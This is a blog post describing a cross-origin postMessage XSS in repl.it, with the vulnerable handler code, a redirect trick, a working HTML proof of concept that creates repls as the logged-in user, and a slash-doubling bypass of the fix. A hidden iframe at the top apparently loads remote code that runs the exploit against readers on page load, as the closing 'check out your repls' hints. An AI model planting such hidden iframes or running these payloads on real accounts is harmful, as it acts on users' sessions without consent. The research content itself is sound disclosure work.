---
layout: post
title: Repl.it XSS
---

<iframe style="display:none" src="https://gistcdn.githack.com/kmh11/f02e5c33844ac5ac1f18ed3be0632fce/raw/631fc0ce170d09da8d54a23772c21bb99910714f/replit.html"></iframe>

I recently found a rather interesting, non-traditional XSS vulnerability in [repl.it](https://repl.it). I was inspired to try this after reading a [writeup](https://github.com/koczkatamas/gctf19/tree/master/pastetastic) for Pastetastic from Google CTF 2019, which showed off some really cool cross-origin stuff with iframes.

In case you're not familiar with repl.it, it's basically an online IDE with tons of features, including website hosting. Each program you make runs in its own environment called a "repl" (it's a lot more than just a read-eval-print loop)

While messing around with how different features worked, I discovered that repls for static sites (HTML, CSS, JS) were previewed in a few nested iframes. Specifically, the site preview consisted of an iframe of [https://replbox.repl.it/public/secure/](https://replbox.repl.it/public/secure/), which contained a blank iframe manipulated by its parent, which was modified to contain an iframe pointing to the URL where the static files are hosted:

```
https://replbox.repl.it/data/web_hosting_1/<username>/<repl_name>/
```

I'm actually going to take a little detour and look at something interesting with the sandboxing of that iframe: 

```javascript
sandbox="allow-forms allow-pointer-lock allow-popups allow-same-origin allow-scripts allow-modals"
```

If this was done correctly, it would prevent the iframe containing user content from messing with the top window's location since the `allow-top-navigation` option is not set. However, the `allow-same-origin` attribute means it is not sandboxed from accessing windows that are also on `replbox.repl.it`, and it just so happens the parent two levels up (the ironically named `/public/secure` page) is both on the same origin and not sandboxed. This means the location of the top window, `repl.it`, can be modified with something like:

```javascript
window.parent.parent.eval("top.location.href = 'https://kmh.zone'")
```

An arbitrary redirect isn't a particulary high severity vulnerability, but it obviously goes against the intent of the authors of the code, and shows that cross-origin frame stuff is very weird.

Now let's start looking at the actual XSS vulnerability. The `/public/secure` page imports a script, [runner.js](https://replbox.repl.it/public/secure/runner.js). After some variable renaming and refactoring, the important part of the code looks like this:

```javascript
var listeners = { load: s, evaljs: a, html: i };
var secret;
window.addEventListener("message", function(event) {
  var req = JSON.parse(event.data);
  if (req.secret) {
    if (secret || "handshake" !== req.type) {
      if (req.secret !== secret) return;
      if (!listeners[req.type]) throw Error("No listeners for event:" + req.type);
      listeners[req.type](req.data);
    } else secret = req.secret;
  }
})
```

There's a pretty glaring issue here &mdash; the message handler doesn't check the origin. This means we can stick this in an iframe in our own site and send any messages we want, including `evaljs` (which, per it's name, evaluates JavaScript).

So this gives us full code execution on `replbox.repl.it`. The thing is that this is kind of useless; there is a session cookie on that domain, but I couldn't see anything it authenticated for. I messed around for a while trying to find stuff like a path I could host a service worker on, but all the user controlled content was under directories based on username and repl name.

As I continued to mess around, I started to notice the similarities between the API on `repl.it` and `replbox.repl.it`: they both had `/data` routes, they both had `/public` routes, and the 404 pages were the same. Eventually I realized that if I set my session cookie to be the same on `replbox.repl.it` as `repl.it`, I could access the authenticated API routes. Then I had an idea &mdash; what if there was `/public/secure/` on `repl.it`? And lo and behold, there it was! I had arbitrary JavaScript execution on the main domain. I quickly wrote up a proof of concept that created a repl as the currently signed in user:

```html
<iframe style="position:absolute;left:-100000px;" id="repl" src="https://repl.it/public/secure"></iframe>
<script>
function createRepl(){
  var xhr = new XMLHttpRequest();
  xhr.open("POST", 'https://repl.it/data/repls/new');
  xhr.setRequestHeader("Content-Type", "application/json");
  xhr.send(JSON.stringify({language: "python3", title: "kmh was here " + Math.floor(Math.random()*1000000), folderId: "", isPrivate: false, description: ""}));
}
setTimeout(function() {
  repl.contentWindow.postMessage(JSON.stringify({secret: "asdf", type: "handshake"}), "*");
    setTimeout(function() {
      repl.contentWindow.postMessage(JSON.stringify({secret: "asdf", type: "load"}), "*")
        setTimeout(function() {
          repl.contentWindow.postMessage(JSON.stringify({secret: "asdf", type: "evaljs", data: createRepl.toString()+";createRepl()"}), "*")
        }, 200)
    }, 200);
}, 200);
</script>
```
I contacted the repl.it team on Discord, and after waiting a bit, I got a reply and it was forwarded over to the engineering team. Now, according to their [security page](https://repl.it/site/docs/misc/security), they "work with you to fix the issue and then we will credit you on our blog." After the initial report, they gave me a year-long free "hacker" plan, and I didn't hear from them again.

I noticed a bit later that they pushed a "fix" to the issue by redirecting from

```
https://repl.it/public/secure/
```

to

```
https://replbox.repl.it/public/secure/
``` 

However, in my toolkit of random things that sometimes work, I had a trick that was the intended solution for a problem I wrote for [ångstromCTF 2019](https://kmh.zone/blog/2019/04/24/angstromctf-2019.html#dom-validator): there are often inconsistensies in how having multiple slashes in a URL is handled. Some web servers collapse them, some don't.

In this case, it seems like however they are matching the redirect does not collapse multiple slashes, but the reverse proxy to the API does. This means that you can go to [https://repl.it/public//secure/](https://repl.it/public//secure/) and still get full code execution on the `repl.it` domain. Since they never contacted me to verify whether it was fixed, I had no way or reason to let them know. Oh well.

PS: If you're currently logged in to repl.it, check out your [repls](https://repl.it/repls) ;)
